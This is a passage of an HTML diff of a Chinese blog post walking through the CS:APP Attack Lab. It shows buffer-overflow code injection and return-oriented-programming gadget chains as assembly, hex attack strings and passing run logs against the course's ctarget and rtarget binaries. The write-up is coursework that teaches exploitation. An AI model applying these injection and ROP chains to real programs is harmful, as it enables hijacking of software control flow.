+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     $0x5566f7c8,%rdi<br>pushq   $0x4017a0<br>ret<br></code></pre></td></tr></table></figure>
 <p>这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">phase3.o:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi<br>   7:   68 a0 17 40 00          pushq  $0x4017a0<br>   c:   c3                      retq<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">phase3.o:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi<br>   7:   68 a0 17 40 00          pushq  $0x4017a0<br>   c:   c3                      retq<br></code></pre></td></tr></table></figure>
 <p>查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38  30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 c7 c7 c8 f7 66 55 68<br>a0 17 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>a8 f7 66 55 00 00 00 00<br>36 33 31 34 39 33 38 30<br>00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 c7 c7 c8 f7 66 55 68<br>a0 17 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>a8 f7 66 55 00 00 00 00<br>36 33 31 34 39 33 38 30<br>00<br></code></pre></td></tr></table></figure>
 <p>转换输入运行</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q<br>Cookie: 0x63149380<br>Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget<br>PASS: Would have posted the following:<br>	user id	2017211523<br>	course	f18<br>	lab	attacklab<br>	result	117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q<br>Cookie: 0x63149380<br>Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget<br>PASS: Would have posted the following:<br>	user id	2017211523<br>	course	f18<br>	lab	attacklab<br>	result	117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00<br></code></pre></td></tr></table></figure>
 <h4 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h4><p>在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：  </p>
 <p>1.函数栈随机化 ，无法再获取绝对地址。  </p>
 <p>2.栈内存的内容被锁定为不可执行。  </p>
 <p>故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。</p>
 <h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq 	%rax<br>movq	%rax,%rdi<br>ret<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq 	%rax<br>movq	%rax,%rdi<br>ret<br></code></pre></td></tr></table></figure>
 <p>查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。  </p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>3c 18 40 00 00 00 00 00	/*	popq rax		*/<br>80 93 14 63 00 00 00 00	/*	cookie			*/<br>49 18 40 00 00 00 00 00	/*	movq %rax,%rdi 	*/<br>cc 16 40 00 00 00 00 00 /*	touch2			*/<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>3c 18 40 00 00 00 00 00	/*	popq rax		*/<br>80 93 14 63 00 00 00 00	/*	cookie			*/<br>49 18 40 00 00 00 00 00	/*	movq %rax,%rdi 	*/<br>cc 16 40 00 00 00 00 00 /*	touch2			*/<br></code></pre></td></tr></table></figure>
 <p>转换输入运行</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget <br>Cookie: 0x63149380<br>Type string:Touch2!: You called touch2(0x63149380)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget <br>Cookie: 0x63149380<br>Type string:Touch2!: You called touch2(0x63149380)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
 <h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意：  </p>
 <p>1.0x90代表nop，除了将pc加1之外不做任何事。  </p>
 <p>2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 </p>
 <p>需要的指令有</p>
-<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq	%rsp,%rax<br>movq	%rax,%rdi<br>popq	%rax<br>movl	%eax,%ecx<br>movl	%ecx,%edx<br>movl	%edx,%esi<br>lea(%rdi, %rsi, 1),%rax<br>movq	%rax,%rdi<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq	%rsp,%rax<br>movq	%rax,%rdi<br>popq	%rax<br>movl	%eax,%ecx<br>movl	%ecx,%edx<br>movl	%edx,%esi<br>lea(%rdi, %rsi, 1),%rax<br>movq	%rax,%rdi<br></code></pre></td></tr></table></figure>
 <p>则攻击字符串为</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>bd 18 40 00 00 00 00 00	/*	gadget1			*/<br>49 18 40 00 00 00 00 00	/*	gadget2			*/<br>30 18 40 00 00 00 00 00	/* 	gadget3			*/<br>48 00 00 00 00 00 00 00	/*	cookie字符串偏移量*/<br>13 19 40 00 00 00 00 00	/*	gadget4			*/<br>ca 18 40 00 00 00 00 00	/*	gadget5			*/<br>b7 18 40 00 00 00 00 00	/*	gadget6			*/<br>69 18 40 00 00 00 00 00	/*	gadget7			*/<br>49 18 40 00 00 00 00 00	/*	gadget8			*/<br>a0 17 40 00 00 00 00 00 /*	touch3地址   	   */<br>36 33 31 34 39 33 38 30 /* 	cookie字符串	  */<br>00<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>bd 18 40 00 00 00 00 00	/*	gadget1			*/<br>49 18 40 00 00 00 00 00	/*	gadget2			*/<br>30 18 40 00 00 00 00 00	/* 	gadget3			*/<br>48 00 00 00 00 00 00 00	/*	cookie字符串偏移量*/<br>13 19 40 00 00 00 00 00	/*	gadget4			*/<br>ca 18 40 00 00 00 00 00	/*	gadget5			*/<br>b7 18 40 00 00 00 00 00	/*	gadget6			*/<br>69 18 40 00 00 00 00 00	/*	gadget7			*/<br>49 18 40 00 00 00 00 00	/*	gadget8			*/<br>a0 17 40 00 00 00 00 00 /*	touch3地址   	   */<br>36 33 31 34 39 33 38 30 /* 	cookie字符串	  */<br>00<br></code></pre></td></tr></table></figure>
 <p>转换文件运行</p>
-<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget <br>Cookie: 0x63149380<br>Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget <br>Cookie: 0x63149380<br>Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
 <h3 id="到此为止"><a href="#到此为止" class="headerlink" title="到此为止"></a>到此为止</h3>
-    </main>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
     <footer class="post-footer">
       
-      <div class="post-tags">
-        
-        <a class="post-tag button" href="/tags/CS-APP/" rel="tag"><i class="fas fa-tags"></i>CS:APP</a>
-        
-        <a class="post-tag button" href="/tags/汇编/" rel="tag"><i class="fas fa-tags"></i>汇编</a>
-        
-        <a class="post-tag button" href="/tags/代码注入攻击/" rel="tag"><i class="fas fa-tags"></i>代码注入攻击</a>
-        
-      </div>
+        <div class="post-tags">
+          
+            <a href="/tags/CS-APP/" rel="tag"># CS:APP</a>
+          
+            <a href="/tags/汇编/" rel="tag"># 汇编</a>
+          
+            <a href="/tags/代码注入攻击/" rel="tag"># 代码注入攻击</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/01/Bomb_lab2/" rel="next" title="Bomb_lab2">
+                <i class="fa fa-chevron-left"></i> Bomb_lab2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/09/Python数据清洗初步/" rel="prev" title="Python数据清洗初步">
+                Python数据清洗初步 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
       
     </footer>
+  </div>
+  
+  
+  
   </article>
-  
-  
-  <nav class="page-nav">
-    <div class="page-nav-next page-nav-item">
-      
-      <a href="/2018/12/01/Bomb_lab2/" rel="next" title="Bomb_lab2"><i class="fas fa-angle-left"></i><span class="nav-title">Bomb_lab2</span></a>
+
+
+
+    <div class="post-spread">
       
     </div>
-    <div class="page-nav-prev page-nav-item">
-      
-      <a href="/2018/12/09/Python数据清洗初步/" rel="prev" title="Python数据清洗初步"><span class="nav-title">Python数据清洗初步</span><i class="fas fa-angle-right"></i></a>
-      
-    </div>
-  </nav>
-  
-  
-</div>
+  </div>
+
 
           </div>
           
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="Wmc">
+            
+              <p class="site-author-name" itemprop="name">Wmc</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Jason210314" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wmc314@outlook.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/deepmind210" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-link"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
           
           
-<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
-  
-  <div class="search">
-    <div class="form-group">
-      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sprinter1999.github.io" title="学分" target="_blank">学分</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rinchannow.club" title="何萌妹" target="_blank">何萌妹</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ipotato.me" title="gay直" target="_blank">gay直</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qjx.app" title="Q哥" target="_blank">Q哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://kuso-kodo.name1e5s.top" title="于大佬" target="_blank">于大佬</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验描述"><span class="nav-number">1.</span> <span class="nav-text">实验描述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一阶段"><span class="nav-number">1.1.</span> <span class="nav-text">第一阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-1"><span class="nav-number">1.2.</span> <span class="nav-text">phase_1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-2"><span class="nav-number">1.3.</span> <span class="nav-text">phase_2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-3"><span class="nav-number">1.4.</span> <span class="nav-text">phase_3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二阶段"><span class="nav-number">1.5.</span> <span class="nav-text">第二阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-4"><span class="nav-number">1.6.</span> <span class="nav-text">phase_4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phase-5"><span class="nav-number">1.7.</span> <span class="nav-text">phase_5</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#到此为止"><span class="nav-number">2.</span> <span class="nav-text">到此为止</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
     </div>
-  </div>
-  <div class="search-result-box" id="search-result"></div>
-  
-  
-<div class="info sidebar-item" id="info">
-  
-  <img class="author-avatar" src="/images/head.jpeg" alt="Wmc">
-  
-  <h1 class="author-name">Wmc</h1>
-  <h2 class="author-description"></h2>
-  <div class="site-count">
-    
-    <div class="archives-count">
-      <div class="site-count-title">归档</div>
-      <div><a href="/archives/">8</a></div>
-    </div>
-    
-    
-    
-    <span class="site-count-divider divider">|</span>
-    
-    <div class="categories-count">
-      <div class="site-count-title">分类</div>
-      <div><a href="/categories/">3</a></div>
-    </div>
-    
-    
-    
-    <span class="site-count-divider divider">|</span>
-    
-    <div class="tags-count">
-      <div class="site-count-title">标签</div>
-      <div><a href="/tags/">13</a></div>
-    </div>
-    
-  </div>
-  
-  <div class="rss">
-    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
-  </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wmc</span>
+
   
 </div>
 
 
-  <div class="sidebar-sticky">
-    
-    
-    
-    
-    
-    <hr>
-    <div class="post-toc sidebar-item" id="toc-div">
-      <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#实验描述"><span class="toc-text">实验描述</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#第一阶段"><span class="toc-text">第一阶段</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#phase-1"><span class="toc-text">phase_1</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#phase-2"><span class="toc-text">phase_2</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#phase-3"><span class="toc-text">phase_3</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#第二阶段"><span class="toc-text">第二阶段</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#phase-4"><span class="toc-text">phase_4</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#phase-5"><span class="toc-text">phase_5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#到此为止"><span class="toc-text">到此为止</span></a></li></ol></div>
-    </div>
-    
-    
-    
-    <hr>
-    <div class="social-link sidebar-item">
-      <div><i class="far fa-address-card"></i>社交链接<p></p></div>
-      <ul>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
         
-        <li><i class="fas fa-envelope"></i><a href="mailto:wmc314@outlook" target="_blank">E-Mail</a></li>
+
+
+
+
+
+
+
         
-        <li><i class="fab fa-github"></i><a href="https://github.com/Jason210314" target="_blank">GitHub</a></li>
-        
-        <li><i class="fas fa-link"></i><a href="https://blog.csdn.net/deepmind210" target="_blank">CSDN</a></li>
-        
-      </ul>
-    </div>
+      </div>
+    </footer>
+
     
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
     
-    <hr>
-    <div class="blogroll sidebar-item">
-      <div><i class="fas fa-link"></i>友情链接</div>
-      <ul>
-        
-        <li><i class="fas fa-link"></i><a href="https://sprinter1999.github.io/" target="_blank">学分的博客</a></li>
-        
-        <li><i class="fas fa-link"></i><a href="http://rinchannow.club/" target="_blank">何萌妹的博客</a></li>
-        
-        <li><i class="fas fa-link"></i><a href="https://ipotato.me/" target="_blank">gay直的博客</a></li>
-        
-        <li><i class="fas fa-link"></i><a href="https://qjx.app/" target="_blank">Q哥的博客</a></li>
-        
-        <li><i class="fas fa-link"></i><a href="https://kuso-kodo.name1e5s.top/" target="_blank">于大佬的博客</a></li>
-        
-      </ul>
-    </div>
+
     
+
   </div>
-</aside>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
 
 
-          
-        </div>
-      </div>
-    </main>
-    
-<footer id="footer" class="footer" style="background: #33363b;">
-  <div class="container">
-    <div class="back-to-top">
-      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
-    </div>
-    <div class="footer-container">
-      <div class="footer-left">
-        <div class="copyright">
-          <span class="author">Wmc</span><span class="year"><i class="far fa-copyright"></i>2018</span>
-        </div>
-        
-        <div class="busuanzi">
-          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
-        </div>
-        
-      </div>
-      <div class="footer-right">
-        <div class="custom-info">
-          
-          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
-          
-        </div>
-        <div class="powered-by">
-          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
-        </div>
-      </div>
-    </div>
-  </div>
-</footer>
 
 
-  </body>
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
 </html>
